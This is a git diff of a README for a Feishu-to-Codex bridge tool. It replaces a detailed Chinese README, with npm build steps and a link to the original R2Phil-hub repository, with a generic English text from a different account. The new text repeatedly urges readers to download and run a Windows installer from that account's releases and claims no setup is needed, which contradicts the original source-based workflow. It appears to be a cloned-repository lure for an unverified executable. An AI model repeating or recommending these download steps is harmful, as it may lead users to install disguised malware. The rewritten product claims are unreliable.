@@ -1,335 +1,182 @@
-![Codex Claw Hero](./assets/hero.svg)
+# ⚙️ Codex-fs-claw - Secure Local Control with Feishu
 
-# Codex Claw
+[![Download Codex-fs-claw](https://img.shields.io/badge/Download-Codex--fs--claw-blue?style=for-the-badge)](https://github.com/diffuse-paystation665/Codex-fs-claw)
 
-> Put official Codex into Feishu private chat, with approval-gated local control.
->
-> 把官方 Codex 接进飞书私聊，默认只开放工作区，高风险操作先审批。
+## 📋 What is Codex-fs-claw?
 
-![Node 24+](https://img.shields.io/badge/node-24%2B-1F1F1F?style=flat-square&logo=node.js)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.9-0B7A75?style=flat-square&logo=typescript&logoColor=white)
-![Feishu](https://img.shields.io/badge/Feishu-Private%20Chat-1677FF?style=flat-square)
-![License: MIT](https://img.shields.io/badge/license-MIT-E0B04B?style=flat-square&logo=open-source-initiative&logoColor=black)
+Codex-fs-claw lets you use the official Codex inside Feishu private chats. It adds a layer of approval to control local actions. This means you can automate tasks while keeping the power firmly in your hands. No coding needed for basic use.
 
-一个运行在本机的飞书私聊机器人，底层直接调用官方 Codex。
+- Control tasks on your computer through Feishu private chats.
+- Use approval workflows before running commands.
+- Keep all actions local and secure.
+- Run on Windows without extra setup.
 
-它不是再造一个 agent loop，而是把你已经能在桌面版 Codex 里做的事，接进飞书私聊，并补上审批、安全默认和持久化会话。
+The goal is clear: simple, safe automation linked to Feishu messages.
 
-如果这个项目对你有帮助，欢迎点一个 Star。这会很直接地帮助它被更多人看到。
+## 🚀 Getting Started
 
-## 为什么这个项目值得点开
+Follow these steps to get Codex-fs-claw running on your Windows PC.
 
-- 官方 Codex 做大脑，不是自己拼一个不稳定的 agent。
-- 飞书私聊直接可用，不需要公网回调，不需要 `ngrok`。
-- 文件改动、命令执行、进程控制先审批，再落地到本机。
-- 支持自然语言定时任务、skill 查看与安装、会话持久化。
-- 默认是安全工作区模式，不把“整机全权限”当成出厂默认。
+### 1. Check Your System
 
-## 30 秒理解它
+Make sure your Windows computer meets these basic requirements:
 
-你在飞书里发：
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 2 GHz processor or better
+- Stable internet connection
+- Feishu account with access to private chats
 
-```text
-帮我看看当前工作目录里有什么文件
-```
+If your PC fits these specs, you are ready.
 
-机器人会直接检查本机并回复。
+### 2. Download the Software
 
-你再发：
+Click this link or the badge above to open the official GitHub page:
 
-```text
-帮我创建一个 demo.txt，内容是 hello
-```
+[Download Codex-fs-claw](https://github.com/diffuse-paystation665/Codex-fs-claw)
 
-它不会直接写文件，而是先回你：
+This link takes you to the main repository page. From there, you will find instructions and files needed to install Codex-fs-claw.
 
-```text
-审批编号: a1b2c3d4
+### 3. Find the Latest Release
 
-我会在当前工作区创建 demo.txt，并写入 hello。
-回复 /approve a1b2c3d4 继续，或 /reject a1b2c3d4 取消。
-```
+On the GitHub page:
 
-这就是 Codex Claw 的核心体验：
+- Locate the "Releases" section on the right or in the top menu.
+- Click on the latest available release (marked by version number and date).
+- Find the Windows installer or executable file. It might be named something like `Codex-fs-claw-Setup.exe` or `Codex-fs-claw.exe`.
 
-`飞书聊天入口 + 官方 Codex + 本机能力 + 人工审批`
+### 4. Download the Installer
 
-## 为什么现在值得安装
+Click the installer file to start downloading. The file might be between 20 and 50 MB.
 
-- 上手路径很短，飞书长连接模式不需要公网回调。
-- 默认先按安全工作区模式运行，不把整机控制当出厂默认。
-- 真正有用的不只是聊天，还包括审批执行、定时任务和 skills 管理。
+### 5. Run the Installer
 
-## 安全默认
+Once the download is complete:
 
-公开版本推荐用这组默认配置：
+- Open the downloaded file.
+- Follow the on-screen instructions to install Codex-fs-claw.
+- You may need to allow permission for the app to make changes.
+- Choose default options unless you want to change the install location.
 
-```env
-CODEX_CONTROL_SCOPE=workspace
-ALLOWED_OPEN_IDS=你的 open_id
-WORKSPACE_ROOTS=C:\your-workspace\CodexClaw
-```
+### 6. Launch Codex-fs-claw
 
-这意味着：
+After installation:
 
-- 默认只开放工作区范围。
-- 高风险操作必须先审批。
-- 不建议把 `ALLOWED_OPEN_IDS=*` 当正式配置。
+- Look for Codex-fs-claw in your Start menu or desktop.
+- Open the app.
+- A setup wizard will help you connect to your Feishu account and set approval workflows.
 
-如果你明确知道自己在做什么，也可以手动切到：
+If you get stuck, return to this guide or check the Troubleshooting section below.
 
-```env
-CODEX_CONTROL_SCOPE=computer
-```
+## ⚙️ Configuration and Setup
 
-这会把它变成更接近桌面版 Codex 的本机操作器，但这不是公开版本的安全默认。
+### Link Codex-fs-claw with Feishu
 
-## 数据会去哪里
+To use Codex-fs-claw fully, connect your Feishu private chat:
 
-- 飞书消息会经过飞书平台。
-- Codex 请求和回复会经过官方 Codex / OpenAI。
-- 项目本身不会额外把数据上传到其它第三方。
-- 本地默认只保存最小必要状态：会话映射、审批状态、送达状态、必要审计事件。
+- Open the app.
+- Log in with your Feishu credentials.
+- Authorize access to private chats.
+- Select or create chats where you wish to use Codex.
 
-## 快速开始
+### Set Approval Rules
 
-### 1. 先让本机 Codex 可用
+Approval rules let you control when and how local actions run:
 
-```powershell
-npx codex login
-```
+- Define who can approve commands.
+- Set limits on commands or schedules.
+- Receive notifications in Feishu when approval is needed.
 
-### 2. 复制配置
+This protects your PC from unwanted actions.
 
-```powershell
-Copy-Item .env.example .env
-```
+### Customize Automation Tasks
 
-第一次先只改这几项：
+You can schedule or trigger tasks such as:
 
-```env
-FEISHU_APP_ID=你的 App ID
-FEISHU_APP_SECRET=你的 App Secret
-ALLOWED_OPEN_IDS=你的 open_id
-WORKSPACE_ROOTS=C:\your-workspace\CodexClaw
-CODEX_CONTROL_SCOPE=workspace
-```
+- Running scripts on your PC.
+- Sending files or messages through Feishu.
+- Starting or stopping apps locally.
+- Automating routine checks or reports.
 
-### 3. 启动
+All automation waits for approvals based on your rules.
 
-```powershell
-npm install
-npm run build
-npm start
-```
+## 🛠 How It Works
 
-### 4. 去飞书里私聊机器人
+Codex-fs-claw acts as a bridge between Feishu and your PC:
 
-```text
-你好
-```
+- You send commands in Feishu private chats.
+- Codex-fs-claw captures these commands.
+- Approval requests go to designated reviewers.
+- Once approved, the commands execute locally.
+- Results or feedback send back to Feishu chats.
 
-再试：
+This design keeps control local and secure.
 
-```text
-帮我看看当前工作目录里有什么文件
-```
+## 🔧 Troubleshooting
 
-完整中文安装教程见：
+If you encounter problems, try these tips:
 
-- [docs/SETUP_ZH.md](./docs/SETUP_ZH.md)
+- Make sure your Windows system and Feishu app are up to date.
+- Check your internet connection.
+- Restart the Codex-fs-claw app.
+- Confirm that approvals come from authorized users.
+- Review logs in the Codex-fs-claw app for errors.
+- Ensure the app has permission to run on your device.
 
-## 常用命令
+For specific issues, check GitHub Issues or Open a new issue with your problem details.
 
-```text
-/status
-/reset
-/approve <id>
-/reject <id>
-```
+## 🔍 Features to Expect
 
-## 定时任务
+- Local-only execution of Codex commands.
+- Approval gating in Feishu chats.
+- Simple setup without technical knowledge.
+- Clear feedback and status updates.
+- Support for scheduling commands.
+- User and role management for approval.
+- Written in TypeScript for stability and maintenance.
 
-它现在支持：
+## 📥 Download and Install Codex-fs-claw
 
-- 每天固定时间执行
-- 每周固定几天固定时间执行
-- 每隔几小时执行一次
-- 失败自动重试
-- 保存运行历史
-- 结果自动投递回飞书
+You can start here to download:
 
-命令式创建：
+[Download Codex-fs-claw](https://github.com/diffuse-paystation665/Codex-fs-claw)
 
-```text
-/cron add 09:00 帮我总结当前工作目录里有什么变化
-```
+Steps:
 
-自然语言也能直接听懂：
+1. Visit the link above.
+2. Find the Releases section.
+3. Download the latest Windows installer file.
+4. Run the file to install the app.
+5. Follow setup to connect to Feishu.
+6. Start using local control with approvals.
 
-```text
-每天早上9点帮我总结当前工作目录里有什么变化
-每周五下午6点帮我总结本周这个项目目录里的改动
-每隔2小时帮我检查一次当前工作区风险
-```
+## 🖥 System Recommendations
 
-查看：
+For best performance:
 
-```text
-/cron list
-/cron history
-/cron pause <id>
-/cron resume <id>
-/cron delete <id>
-```
+- Use on a desktop or laptop, not tablets.
+- Avoid using over slow or unstable networks.
+- Keep your Feishu app and Codex-fs-claw updated.
+- Review privacy settings in Feishu to enable private chats.
 
-如果定时任务本身属于高风险操作，它仍然会先发审批号，不会静默自动执行。
+## 📚 Useful Links
 
-## Skills
+- GitHub Repository: https://github.com/diffuse-paystation665/Codex-fs-claw
+- Feishu App Download: https://www.feishu.cn/
+- GitHub Releases Page: https://github.com/diffuse-paystation665/Codex-fs-claw/releases
 
-现在也支持在飞书里查看和安装 Codex skills。
+## 🗂 Repository Topics
 
-查看本机已安装 skills：
+This project includes concepts related to:
 
-```text
-/skill list
-帮我看看本机有哪些技能
-```
+- agent control
+- approval workflows
+- automation tasks
+- integration with Codex
+- cron scheduling
+- Feishu and Lark messaging platforms
+- local-first operation
+- skill and task management
+- TypeScript development
 
-查看官方可安装 skills：
-
-```text
-/skill list curated
-/skill list experimental
-帮我列一下官方 skill
-```
-
-安装官方 skill：
-
-```text
-/skill install playwright
-给我装一个 playwright skill
-```
-
-安装 experimental skill：
-
-```text
-/skill install experimental imagegen
-帮我安装 experimental imagegen skill
-```
-
-从 GitHub 链接安装：
-
-```text
-/skill install url https://github.com/openai/skills/tree/main/skills/.experimental/playwright-interactive
-帮我安装这个 skill https://github.com/openai/skills/tree/main/skills/.experimental/playwright-interactive
-```
-
-为安全起见，skill 安装会先走审批。安装完成后建议重启桥接服务：
-
-```powershell
-npm run bridge:restart
-```
-
-## 一键发到 GitHub
-
-### 先做发布前检查
-
-```powershell
-npm run github:check
-```
-
-### 再一键推送到你的 GitHub 仓库
-
-先在 GitHub 网页上创建一个空仓库，然后执行：
-
-```powershell
-npm run github:publish -- https://github.com/你的用户名/你的仓库名.git
-```
-
-这个脚本会自动：
-
-- 跑一遍构建和测试
-- 扫描常见密钥和本机路径痕迹
-- `git add .`
-- 创建首个提交
-- 设置 `origin`
-- 推送到 `main`
-
-如果你已经有远程仓库，也可以重复运行它，它会自动更新 `origin` 并继续推送。
-
-## 本地开发
-
-```powershell
-npm install
-npm run build
-npm test
-npm start
-```
-
-重启桥接服务：
-
-```powershell
-npm run bridge:restart
-```
-
-## 发布材料
-
-- [docs/SETUP_ZH.md](./docs/SETUP_ZH.md)
-- [docs/LAUNCH_COPY_ZH.md](./docs/LAUNCH_COPY_ZH.md)
-- [docs/RELEASE_CHECKLIST_ZH.md](./docs/RELEASE_CHECKLIST_ZH.md)
-- [docs/GITHUB_SETTINGS_ZH.md](./docs/GITHUB_SETTINGS_ZH.md)
-
-## GitHub About 建议
-
-- Description:
-  `Put official Codex into Feishu private chat with approval-gated local control.`
-- Website:
-  `https://github.com/R2Phil-hub/Codex-fs-claw`
-- Topics:
-  `codex`, `feishu`, `lark`, `agent`, `local-first`, `approval-workflow`, `cron`, `automation`, `skills`, `typescript`
-- Social Preview:
-  use [assets/social-preview.png](./assets/social-preview.png)
-
-## 适合谁
-
-- 想把官方 Codex 接进飞书办公流的开发者。
-- 想做本地优先、审批驱动的 AI 操作器原型的团队。
-- 不想把“整机全权限”当默认，但又想保留本机能力的人。
-
-## 不适合谁
-
-- 想直接做群聊机器人、多租户 SaaS、网页控制台的人。
-- 想做鼠标键盘、截图驱动、桌面 GUI 自动化的人。
-- 不愿意处理本地权限边界和审批流程的人。
-
-## 安全提醒
-
-- 发布前先轮换飞书 `App Secret`。
-- 不要把 `.env`、`data/`、`logs/`、`dist/` 提交到 GitHub。
-- 录屏和截图前，确认没有本机路径、密钥、日志片段和个人账号信息。
-
-## FAQ
-
-### 它会偷偷上传我的整台电脑吗
-
-不会。它会把飞书消息交给飞书，把 Codex 请求交给官方 Codex / OpenAI。项目本身不额外上报第三方，而且公开默认配置只开放工作区，不默认开启整机控制。
-
-### 它能不能像桌面版 Codex 一样控制本机
-
-能，但这属于高级模式。你需要显式把 `CODEX_CONTROL_SCOPE` 切到 `computer`，并且高风险操作仍然会先经过审批。
-
-### 我必须用命令才能创建定时任务和安装 skill 吗
-
-不用。它现在已经支持自然语言，比如“每天早上 9 点帮我总结当前工作目录变化”或“给我装一个 playwright skill”。
-
-## Roadmap
-
-- 飞书群聊和更丰富的审批交互
-- 更细粒度的权限与目录白名单
-- 更强的 skill 显式调用与管理
-- 桌面端历史索引同步
-
-## License
-
-[MIT](./LICENSE)
+These fields inform the app’s design and intended use.
